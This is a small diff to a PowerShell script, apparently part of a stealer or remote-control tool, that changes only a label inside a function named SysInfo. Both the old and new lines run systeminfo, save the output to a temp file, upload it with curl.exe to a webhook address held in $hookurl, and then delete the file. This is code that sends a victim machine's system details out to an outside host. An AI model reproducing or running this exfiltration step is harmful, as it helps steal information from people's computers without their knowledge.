@@ -222,7 +222,7 @@ function SysInfo {
 
     $InfoTemp = "$env:temp\info.txt"
     systeminfo | Out-File $InfoTemp
-    curl.exe -F "file1=@$InfoTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":mag:Systeminfo:\"}"' $hookurl | Out-Null
+    curl.exe -F "file1=@$InfoTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":mag:SystemInfo:\"}"' $hookurl | Out-Null
     Remove-Item $InfoTemp
 }
 
